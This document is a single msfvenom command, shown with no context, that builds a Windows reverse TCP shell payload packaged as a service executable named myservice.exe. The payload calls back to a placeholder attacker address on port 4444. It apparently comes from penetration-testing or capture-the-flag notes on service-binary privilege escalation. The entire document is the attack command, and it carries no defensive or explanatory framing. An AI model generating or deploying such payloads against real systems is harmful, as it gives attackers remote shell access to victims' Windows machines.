```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```


